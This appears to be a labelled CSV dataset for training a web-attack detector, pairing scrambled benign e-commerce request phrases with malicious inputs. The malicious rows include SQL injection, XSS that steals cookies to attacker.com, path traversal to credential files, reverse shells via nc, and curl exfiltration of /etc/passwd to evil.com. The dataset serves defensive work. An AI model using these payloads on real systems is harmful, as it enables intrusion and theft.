+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+username=admin&password=admin123,1
+number track tracking shipment req118,0
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+1'; WAITFOR DELAY '0:0:5'--,1
+<div onmouseover=alert(1)>hover</div>,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+password reset link req891,0
+data report csv as export req332,0
+"id=1 AND 1=CONVERT(int,@@version)--",1
+php://filter/convert.base64-encode/resource=config.php,1
+multiple failed login attempts detected for admin,1
+repeated authentication failure admin account locked,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+GET /console HTTP/1.1,1
+map store locations req357,0
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+1' OR '1'='1,1
+1; DROP TABLE users--,1
+account dashboard get req585,0
+; ping -c 4 attacker.com,1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+../../wp-config.php,1
+username=admin&password=123456,1
+"';alert(String.fromCharCode(88,83,83))//",1
+GET /admin/config.php HTTP/1.1,1
+| wget http://attacker.com/shell.sh,1
+; ping -c 4 attacker.com,1
+../../../../proc/self/environ,1
+; ping -c 4 attacker.com,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+GET /actuator/env HTTP/1.1,1
+and terms view conditions page req768,0
+<a href='javascript:alert(1)'>click</a>,1
+GET /server-status HTTP/1.1,1
+rate review product req1056,0
+GET /admin/config.php HTTP/1.1,1
+to results 100 price range by req219,0
+username=admin&password=admin,1
+with username login and password req535,0
+../../../../var/www/html/config.php,1
+view map on store locations req511,0
+to support send seller message req1076,0
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+subscribe with email req611,0
+username=admin'/*,1
+password and username with login req60,0
+view history days for order req209,0
+by brand filter apply req791,0
+invoice number order for download req841,0
+locations on map req123,0
+<textarea onfocus=alert(1) autofocus>,1
+recommendations view history on based req420,0
+' HAVING 1=1--,1
+; ls -la,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+|| nc -e /bin/sh attacker.com 4444,1
+& ipconfig,1
+../../../../proc/self/environ,1
+admin' AND 1=1--,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+' OR 'x'='x,1
+store on locations view req126,0
+"1 UNION SELECT @@version,NULL--",1
+username=admin&password=qwerty,1
+username=admin&password=abc123,1
+<div onmouseover=alert(1)>hover</div>,1
+<iframe src=javascript:alert('XSS')>,1
+request refund support contact req58,0
+learning machine books about search req1123,0
+products by for req674,0
+1' ORDER BY 10--,1
+with number track shipment tracking req440,0
+repeated authentication failure admin account locked,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+| cat /etc/passwd,1
+address shipping for order req529,0
+<svg onload=alert(document.domain)>,1
+1; DROP TABLE users--,1
+1' AND SLEEP(5)--,1
+to account language change arabic req353,0
+..\..\..\windows\system32\drivers\etc\hosts,1
+username=admin&password=admin,1
+GET /backup.sql HTTP/1.1,1
+<a href='javascript:alert(1)'>click</a>,1
+GET /admin/config.php HTTP/1.1,1
+& ipconfig,1
+username=admin&password=batman,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+' OR 1=1#,1
+message send support req468,0
+<body onload=alert('XSS')>,1
+username=administrator&password=12345,1
+; ping -c 4 attacker.com,1
+<script>alert('XSS')</script>,1
+locations store map req554,0
+"1 UNION SELECT @@version,NULL--",1
+<body onload=alert('XSS')>,1
+"1 UNION SELECT username,password FROM users--",1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+<svg><script>alert(1)</script></svg>,1
+preference set express to delivery req1002,0
+' OR 1=1#,1
+user profile get for account req865,0
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+GET /web.config HTTP/1.1,1
+language account change arabic to req906,0
+latest news articles get feed req886,0
+order number invoice for req344,0
+reset link password via req352,0
+on based recommendations history view req467,0
+support for refund request req1132,0
+<input onfocus=alert(1) autofocus>,1
+<a href='javascript:alert(1)'>click</a>,1
+stars product rate 5 review req14,0
+learning books about machine search req645,0
+1' ORDER BY 10--,1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+password=1' OR '1'='1' /*,1
+arabic account language req994,0
+product return for policy view req239,0
+password=1' OR '1'='1' /*,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+repeated authentication failure admin account locked,1
+policy product for view return req226,0
+tracking shipment track with number req455,0
+../.env,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+credit checkout with payment card req630,0
+picture jpeg format profile upload req639,0
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+page view terms conditions and req602,0
+../../../etc/shadow,1
+learning books about req833,0
+for view policy return req900,0
+language account change req152,0
+admin'--,1
+"1 UNION SELECT username,password FROM users--",1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+card checkout credit req424,0
+admin' AND 1=1--,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+view products section req69,0
+last 30 for history req697,0
+subscribe with email newsletter to req518,0
+repeated authentication failure admin account locked,1
+|| nc -e /bin/sh attacker.com 4444,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+update shipping order address for req165,0
+for product policy return view req368,0
+"1 UNION SELECT @@version,NULL--",1
+1'; DELETE FROM orders WHERE 1=1--,1
+GET /actuator/env HTTP/1.1,1
+articles latest get news feed req1175,0
+order for number invoice download req919,0
+username=administrator&password=12345,1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+username=admin&password=password,1
+& net user hacker Password1 /add,1
+<body onload=alert('XSS')>,1
+and username login password req904,0
+GET /server-status HTTP/1.1,1
+search products electronics category for by req452,0
+1' OR 1=1--,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+browse mobile phones category req1097,0
+1' AND SLEEP(5)--,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+language change arabic account req418,0
+link email reset req41,0
+| uname -a,1
+/etc/passwd%00,1
+1' ORDER BY 10--,1
+$(whoami),1
+; cat /etc/shadow,1
+category for products search electronics req1029,0
+username=admin&password=superman,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+GET /server-status HTTP/1.1,1
+$(whoami),1
+username=admin&password=abc123,1
+; ls -la,1
+../../../etc/shadow,1
+../../wp-config.php,1
+by brand name filter apply req128,0
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+username=admin&password=admin123,1
+<img src=x onerror=alert(1)>,1
+| uname -a,1
+username=administrator&password=12345,1
+; cat /etc/shadow,1
+name brand by apply filter req936,0
+....//....//etc/passwd,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+number tracking with track shipment req63,0
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+recommendations based history view req144,0
+multiple failed login attempts detected for admin,1
+for feedback form website submit req1178,0
+<img src=x onerror=alert(1)>,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+<video src=1 onerror=alert(1)>,1
+1' AND SLEEP(5)--,1
+compare products specifications two req1131,0
+delivery set preference express to req428,0
+profile upload format req249,0
+`id`,1
+<input onfocus=alert(1) autofocus>,1
+30 last days view history req1087,0
+<details open ontoggle=alert(1)>,1
+username=admin&password=admin123,1
+<body background=javascript:alert(1)>,1
+conditions page terms and view req1033,0
+username=admin&password=abc123,1
+coupon apply at checkout req775,0
+1; DROP TABLE users--,1
+last history 30 for days req484,0
+<textarea onfocus=alert(1) autofocus>,1
+set to preference req1138,0
+new account email register with req1150,0
+by newest listing arrivals sort req1037,0
+username=admin&password=batman,1
+multiple failed login attempts detected for admin,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+"';alert(String.fromCharCode(88,83,83))//",1
+coupon at checkout req816,0
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+order address for update shipping req851,0
+../../../../var/www/html/config.php,1
+get profile dashboard account user req62,0
+for availability check item req1038,0
+<select onfocus=alert(1) autofocus>,1
+<ScRiPt>alert(1)</ScRiPt>,1
+500 results to 100 filter req513,0
+username=user&password=pass,1
+<textarea onfocus=alert(1) autofocus>,1
+username=admin&password=qwerty,1
+related section view products req947,0
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+order shipping for update address req709,0
+<audio src=1 onerror=alert(1)>,1
+' HAVING 1=1--,1
+password via link req200,0
+GET /server-status HTTP/1.1,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+30 order days req135,0
+"1 UNION SELECT username,password FROM users--",1
+panel settings notification view req269,0
+admin'--,1
+file:///etc/passwd,1
+picture upload jpeg format profile req879,0
+1'; WAITFOR DELAY '0:0:5'--,1
+to message send support seller req654,0
+%3Cscript%3Ealert(1)%3C/script%3E,1
+username=test&password=test,1
+<ScRiPt>alert(1)</ScRiPt>,1
+<audio src=1 onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+two authentication enable factor req99,0
+|| nc -e /bin/sh attacker.com 4444,1
+GET /.git/config HTTP/1.1,1
+invoice download for order number req736,0
+| cat /etc/passwd,1
+at coupon checkout discount apply req899,0
+<textarea onfocus=alert(1) autofocus>,1
+notification view settings req379,0
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+view related section products req692,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+<object data=javascript:alert(1)>,1
+support send message seller req964,0
+| cat /etc/passwd,1
+to wishlist for save req710,0
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+form for feedback req497,0
+1' GROUP BY 1--,1
+update for address account billing req984,0
+and password with login username req732,0
+by newest sort listing req797,0
+<svg onload=alert(document.domain)>,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+../../../etc/shadow,1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+compare products two specifications req247,0
+<svg onload=alert(document.domain)>,1
+"1 UNION SELECT username,password FROM users--",1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+account for update req1149,0
+with subscribe email to newsletter req1082,0
+locations map on view req339,0
+GET /crossdomain.xml HTTP/1.1,1
+GET /backup.sql HTTP/1.1,1
+username=admin&password=abc123,1
+support message to send seller req941,0
+username=admin&password=superman,1
+username=admin&password=qwerty,1
+username=user&password=pass,1
+link password via req696,0
+username=admin&password=superman,1
+change to arabic language account req1184,0
+<svg onload=alert(document.domain)>,1
+repeated authentication failure admin account locked,1
+& ipconfig,1
+number tracking with shipment req1060,0
+password spray attack detected multiple users,1
+GET /phpmyadmin HTTP/1.1,1
+on history view recommendations based req619,0
+at discount checkout coupon apply req343,0
+for account address update billing req743,0
+map store on locations view req102,0
+later item wishlist for save to req557,0
+for update address account billing req631,0
+login attempt failed username admin invalid credentials,1
+|| nc -e /bin/sh attacker.com 4444,1
+picture format profile upload req233,0
+books search machine req297,0
+1'; DELETE FROM orders WHERE 1=1--,1
+1' GROUP BY 1--,1
+section related view products req953,0
+save to wishlist for req483,0
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+settings notification panel view req500,0
+<body onload=alert('XSS')>,1
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+GET /console HTTP/1.1,1
+' OR 'x'='x,1
+<script>alert('XSS')</script>,1
+"1 UNION SELECT username,password FROM users--",1
+message send support seller to req181,0
+admin' AND 1=1--,1
+availability store check for item req342,0
+store check availability item for req1198,0
+email subscribe with newsletter req485,0
+articles latest news feed get req666,0
+username=admin&password=123456,1
+reset password email via link req466,0
+<svg><script>alert(1)</script></svg>,1
+<body background=javascript:alert(1)>,1
+' OR 1=1#,1
+1; DROP TABLE users--,1
+books about search req322,0
+user dashboard profile for account req705,0
+1'; EXEC xp_cmdshell('whoami')--,1
+username=admin&password=admin123,1
+picture upload format jpeg req488,0
+notification settings panel view req515,0
+login attempt failed username admin invalid credentials,1
+password and with req96,0
+shipment number track with tracking req3,0
+id=2 OR 1=1,1
+username=user&password=pass,1
+username=admin&password=letmein,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+../../wp-config.php,1
+view on map locations store req838,0
+support seller to req908,0
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+username=test&password=test,1
+../../../../etc/passwd,1
+<svg onload=alert(document.domain)>,1
+<ScRiPt>alert(1)</ScRiPt>,1
+1; DROP TABLE users--,1
+discount checkout apply at req681,0
+"; python -c 'import socket,subprocess'",1
+page conditions view req989,0
+GET /backup.sql HTTP/1.1,1
+category mobile phones req818,0
+search machine about req244,0
+<svg><script>alert(1)</script></svg>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+return view for policy product req657,0
+category for products req1077,0
+' OR 'x'='x,1
+<object data=javascript:alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+checkout coupon at apply req1034,0
+; whoami,1
+GET /crossdomain.xml HTTP/1.1,1
+latest get articles news feed req1197,0
+username=admin&password=letmein,1
+download order for number invoice req542,0
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+; ls -la,1
+id=2 OR 1=1,1
+via media link share social product req193,0
+brute force attempt on login endpoint from single ip,1
+<video src=1 onerror=alert(1)>,1
+username=user&password=pass,1
+mobile category browse phones req1146,0
+price 500 100 results range req794,0
+refund for support request contact req100,0
+1' AND SLEEP(5)--,1
+& net user hacker Password1 /add,1
+login attempt failed username admin invalid credentials,1
+`id`,1
+GET /.git/config HTTP/1.1,1
+for update address order req520,0
+track tracking number shipment with req612,0
+`id`,1
+current logout session from req1176,0
+GET /actuator/env HTTP/1.1,1
+1' OR 1=1--,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+password reset link email via req1122,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+brute force attempt on login endpoint from single ip,1
+../../../../etc/passwd,1
+specifications two compare req271,0
+"id=1 AND 1=CONVERT(int,@@version)--",1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+add item cart to product id req853,0
+..\..\..\windows\system32\drivers\etc\hosts,1
+password spray attack detected multiple users,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+for policy view return product req1042,0
+<video src=1 onerror=alert(1)>,1
+<body background=javascript:alert(1)>,1
+multiple failed login attempts detected for admin,1
+based on recommendations history view req112,0
+login attempt failed username admin invalid credentials,1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+GET /admin/config.php HTTP/1.1,1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+feed articles news get latest req1073,0
+as report data req168,0
+username=root&password=root,1
+username=root&password=root,1
+by sort arrivals newest listing req70,0
+& net user hacker Password1 /add,1
+download number invoice order for req752,0
+download order invoice req207,0
+GET /actuator/env HTTP/1.1,1
+/var/log/apache2/access.log,1
+../../../../proc/self/environ,1
+express to delivery preference set req1173,0
+& ipconfig,1
+social link via product req224,0
+<SCRIPT>alert('XSS')</SCRIPT>,1
+mobile browse phones category req108,0
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+1' OR 1=1--,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+username=admin&password=admin,1
+/etc/passwd%00,1
+multiple failed login attempts detected for admin,1
+brute force attempt on login endpoint from single ip,1
+panel view notification settings req348,0
+....//....//etc/passwd,1
+| wget http://attacker.com/shell.sh,1
+' OR 1=1#,1
+username=admin'/*,1
+credit checkout payment with req479,0
+form feedback submit website for req935,0
+number tracking shipment req13,0
+admin'--,1
+1'; WAITFOR DELAY '0:0:5'--,1
+multiple failed login attempts detected for admin,1
+csv report data export req1177,0
+| wget http://attacker.com/shell.sh,1
+email reset password req993,0
+<SCRIPT>alert('XSS')</SCRIPT>,1
+media link share product via req248,0
+check availability item store for req571,0
+' OR 1=1#,1
+| wget http://attacker.com/shell.sh,1
+|| nc -e /bin/sh attacker.com 4444,1
+& net user hacker Password1 /add,1
+machine learning search books req917,0
+../../.git/config,1
+<object data=javascript:alert(1)>,1
+username=admin&password=password,1
+phones browse mobile category req897,0
+1; DROP TABLE users--,1
+history on based recommendations req677,0
+1'; EXEC xp_cmdshell('whoami')--,1
+latest articles get req591,0
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+1'; EXEC xp_cmdshell('whoami')--,1
+/etc/passwd%00,1
+for store item check req457,0
+username=admin&password=admin,1
+username=admin&password=superman,1
+jpeg picture upload format req598,0
+|| nc -e /bin/sh attacker.com 4444,1
+account arabic change language to req830,0
+repeated authentication failure admin account locked,1
+username=admin&password=admin,1
+....//....//etc/passwd,1
+filter 500 to req1182,0
+products two compare req927,0
+password spray attack detected multiple users,1
+& ipconfig,1
+| uname -a,1
+policy view return req747,0
+<audio src=1 onerror=alert(1)>,1
+1; DROP TABLE users--,1
+password=1' OR '1'='1' /*,1
+page view conditions terms and req1063,0
+products compare two specifications req311,0
+../../.git/config,1
+export data as req1009,0
+javascript:alert(document.cookie),1
+<audio src=1 onerror=alert(1)>,1
+reset password link email via req1199,0
+' OR 'x'='x,1
+track tracking shipment with number req1091,0
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+arabic change to account language req377,0
+| uname -a,1
+category search for by electronics products req90,0
+id=2 OR 1=1,1
+id=2 OR 1=1,1
+new with account register email req907,0
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+check availability store for item req855,0
+language change account arabic to req107,0
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+javascript:alert(document.cookie),1
+<img src=x onerror=alert(1)>,1
+settings panel notification view req229,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+../.env,1
+' HAVING 1=1--,1
+phones mobile category req945,0
+<svg><script>alert(1)</script></svg>,1
+username=admin&password=qwerty,1
+login attempt failed username admin invalid credentials,1
+GET /backup.sql HTTP/1.1,1
+| uname -a,1
+; cat /etc/shadow,1
+"1 UNION SELECT @@version,NULL--",1
+<img src=x onerror=alert(1)>,1
+username=admin&password=1234567890,1
+; ping -c 4 attacker.com,1
+GET /web.config HTTP/1.1,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+shipping address for update req354,0
+repeated authentication failure admin account locked,1
+view section related products req790,0
+javascript:alert(document.cookie),1
+1' ORDER BY 10--,1
+to send support seller message req425,0
+../../../etc/shadow,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+share social product media req71,0
+username=admin'/*,1
+add id to cart req854,0
+submit feedback form req345,0
+<div onmouseover=alert(1)>hover</div>,1
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+username=administrator&password=12345,1
+/var/log/apache2/access.log,1
+contact support request for refund req134,0
+username=test&password=test,1
+jpeg profile picture req472,0
+<iframe src=javascript:alert('XSS')>,1
+subscribe email to with newsletter req589,0
+apply filter by brand name req659,0
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+....//....//etc/passwd,1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+policy product for return view req590,0
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+' OR 'x'='x,1
+at discount coupon apply checkout req615,0
+<img src=x onerror=alert(1)>,1
+../../../../var/www/html/config.php,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+1' OR 1=1--,1
+for last history 30 order days req1048,0
+<audio src=1 onerror=alert(1)>,1
+username=admin&password=abc123,1
+& net user hacker Password1 /add,1
+username=admin&password=batman,1
+/etc/passwd%00,1
+session from current logout req201,0
+$(whoami),1
+<script>alert('XSS')</script>,1
+name by apply brand req1046,0
+<ScRiPt>alert(1)</ScRiPt>,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+1' AND SLEEP(5)--,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+id=2 OR 1=1,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+id=2 OR 1=1,1
+by electronics search for req622,0
+GET /.git/config HTTP/1.1,1
+GET /web.config HTTP/1.1,1
+; ping -c 4 attacker.com,1
+with email newsletter to subscribe req1040,0
+from logout session current req972,0
+price 500 to by filter req539,0
+password=1' OR '1'='1' /*,1
+and username password with login req616,0
+1' GROUP BY 1--,1
+settings view panel req1064,0
+category browse mobile phones req67,0
+view terms and conditions req575,0
+view for days history req238,0
+1' OR 1=1--,1
+email with newsletter to subscribe req987,0
+products related view req581,0
+profile upload format picture jpeg req476,0
+; whoami,1
+brand name by req1190,0
+login password with username req898,0
+policy for view product return req11,0
+password email reset req704,0
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+view on based req1005,0
+by filter name brand apply req974,0
+sort arrivals listing newest by req798,0
+language change arabic account req148,0
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+coupon apply at discount checkout req380,0
+GET /admin/config.php HTTP/1.1,1
+as data report csv req220,0
+"1 UNION SELECT @@version,NULL--",1
+current from session logout req251,0
+`id`,1
+GET /server-status HTTP/1.1,1
+| wget http://attacker.com/shell.sh,1
+username=admin&password=letmein,1
+1' ORDER BY 10--,1
+policy view for req1105,0
+| cat /etc/passwd,1
+GET /actuator/env HTTP/1.1,1
+<script>alert('XSS')</script>,1
+brute force attempt on login endpoint from single ip,1
+refund support contact request req1126,0
+<script>alert('XSS')</script>,1
+/etc/passwd%00,1
+/var/log/apache2/access.log,1
+at apply checkout req1141,0
+"1 UNION SELECT @@version,NULL--",1
+request for support refund contact req419,0
+for update address account req600,0
+link password reset email req259,0
+username=admin&password=abc123,1
+profile format upload picture req34,0
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+change arabic to language req460,0
+admin' AND 1=1--,1
+for policy view return product req839,0
+account address billing req647,0
+500 100 filter req1104,0
+../../.git/config,1
+"';alert(String.fromCharCode(88,83,83))//",1
+<video src=1 onerror=alert(1)>,1
+apply name brand by filter req439,0
+<ScRiPt>alert(1)</ScRiPt>,1
+address for billing req960,0
+GET /web.config HTTP/1.1,1
+<svg><script>alert(1)</script></svg>,1
+../../../../var/www/html/config.php,1
+get feed articles news latest req835,0
+terms conditions and view page req278,0
+id=2 OR 1=1,1
+<svg><script>alert(1)</script></svg>,1
+id=2 OR 1=1,1
+password reset link email via req1099,0
+specifications two compare req443,0
+admin'--,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+apply name brand filter by req813,0
+product return view policy req169,0
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+enable two authentication factor req601,0
+username=admin'/*,1
+repeated authentication failure admin account locked,1
+<details open ontoggle=alert(1)>,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+settings notification panel req402,0
+username=admin&password=password,1
+to arabic language account req734,0
+<video src=1 onerror=alert(1)>,1
+feedback form submit for website req978,0
+"';alert(String.fromCharCode(88,83,83))//",1
+delivery express set preference to req177,0
+1'; WAITFOR DELAY '0:0:5'--,1
+item availability check for store req944,0
+for shipping order address req409,0
+; whoami,1
+javascript:alert(document.cookie),1
+GET /api/swagger.json HTTP/1.1,1
+enable two factor authentication req828,0
+../../../../proc/self/environ,1
+/var/log/apache2/access.log,1
+1; DROP TABLE users--,1
+via share link req667,0
+books about search req564,0
+| uname -a,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+password spray attack detected multiple users,1
+<audio src=1 onerror=alert(1)>,1
+../../../etc/shadow,1
+view section related products req280,0
+history recommendations view on based req274,0
+<div onmouseover=alert(1)>hover</div>,1
+store map locations on view req708,0
+<body onload=alert('XSS')>,1
+on recommendations history based view req85,0
+<svg onload=alert(document.domain)>,1
+GET /server-status HTTP/1.1,1
+jpeg upload picture req335,0
+id=2 OR 1=1,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+feed news articles latest req1158,0
+%3Cscript%3Ealert(1)%3C/script%3E,1
+/etc/passwd%00,1
+GET /.git/config HTTP/1.1,1
+../../.git/config,1
+brute force attempt on login endpoint from single ip,1
+1' OR '1'='1,1
+1' OR 1=1--,1
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+1' GROUP BY 1--,1
+<input onfocus=alert(1) autofocus>,1
+username=admin'/*,1
+view history days 30 for last req620,0
+checkout credit card with req197,0
+<body background=javascript:alert(1)>,1
+username=admin&password=123456,1
+news latest feed get req759,0
+submit for form feedback website req534,0
+; ping -c 4 attacker.com,1
+../../wp-config.php,1
+../../../etc/shadow,1
+with payment credit checkout card req614,0
+; ping -c 4 attacker.com,1
+GET /phpmyadmin HTTP/1.1,1
+social via link product media req1058,0
+../../../../proc/self/environ,1
+articles latest news feed get req120,0
+' OR 'x'='x,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+<details open ontoggle=alert(1)>,1
+GET /admin/config.php HTTP/1.1,1
+<iframe src=javascript:alert('XSS')>,1
+shipping order for update req1137,0
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+product add 42 to id item req925,0
+specifications two compare req10,0
+email via password link reset req305,0
+GET /api/swagger.json HTTP/1.1,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+; id,1
+for form submit website feedback req461,0
+login attempt failed username admin invalid credentials,1
+admin'--,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+| wget http://attacker.com/shell.sh,1
+username=root&password=root,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+GET /config.bak HTTP/1.1,1
+username=root&password=root,1
+1'; EXEC xp_cmdshell('whoami')--,1
+category browse mobile req640,0
+report as csv data export req982,0
+products category by search for req498,0
+product rate 5 req75,0
+<svg><script>alert(1)</script></svg>,1
+id=2 OR 1=1,1
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+for account user profile dashboard get req1025,0
+for shipping update address order req103,0
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+reset link password req1108,0
+via link email reset password req1187,0
+for category products by req934,0
+repeated authentication failure admin account locked,1
+$(whoami),1
+by apply name filter brand req506,0
+terms and view req79,0
+GET /.htaccess HTTP/1.1,1
+specifications two compare products req184,0
+GET /console HTTP/1.1,1
+GET /console HTTP/1.1,1
+..\..\..\windows\system32\drivers\etc\hosts,1
+1'; EXEC xp_cmdshell('whoami')--,1
+GET /api/swagger.json HTTP/1.1,1
+<details open ontoggle=alert(1)>,1
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+share via social link media req949,0
+logout current session from req470,0
+change to account arabic language req113,0
+"1 UNION SELECT username,password FROM users--",1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+update for account billing address req1102,0
+<div onmouseover=alert(1)>hover</div>,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+for to item save later wishlist req1085,0
+<div onmouseover=alert(1)>hover</div>,1
+1'; EXEC xp_cmdshell('whoami')--,1
+rate product stars 5 review req957,0
+<SCRIPT>alert('XSS')</SCRIPT>,1
+../../wp-config.php,1
+username=root&password=root,1
+GET /api/swagger.json HTTP/1.1,1
+panel view notification req533,0
+on view map store locations req774,0
+password=1' OR '1'='1' /*,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+username=administrator&password=12345,1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+1' AND SLEEP(5)--,1
+language change to account arabic req382,0
+username=administrator&password=12345,1
+related view products section req929,0
+| wget http://attacker.com/shell.sh,1
+42 cart id product add req51,0
+specifications two compare products req783,0
+<details open ontoggle=alert(1)>,1
+<script>alert('XSS')</script>,1
+GET /.htaccess HTTP/1.1,1
+<script>alert('XSS')</script>,1
+picture format jpeg upload profile req1054,0
+GET /server-status HTTP/1.1,1
+<ScRiPt>alert(1)</ScRiPt>,1
+' OR 1=1#,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+| uname -a,1
+<body background=javascript:alert(1)>,1
+GET /web.config HTTP/1.1,1
+to item product req802,0
+GET /.htaccess HTTP/1.1,1
+for order invoice download number req1032,0
+GET /config.bak HTTP/1.1,1
+password login username and req1114,0
+username=root&password=root,1
+/var/log/apache2/access.log,1
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+about search books req651,0
+based history on req825,0
